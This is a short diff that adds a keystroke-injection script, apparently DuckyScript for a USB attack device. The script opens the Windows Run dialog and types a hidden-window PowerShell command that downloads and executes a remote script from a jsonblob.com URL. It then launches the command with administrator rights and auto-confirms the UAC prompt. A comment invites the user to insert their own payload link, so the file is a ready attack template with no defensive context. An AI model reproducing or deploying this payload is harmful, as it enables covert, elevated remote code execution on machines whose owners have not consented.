@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r
+DELAY 300
+REM Put Your PowerShell Scripts Link Here
+STRING powershell -w h iex (irm "https://jsonblob.com/api/jsonBlob/984170082246868992")
+DELAY 200
+CTRL-SHIFT-ENTER
+DELAY 3000
+ALT y
+DELAY 100
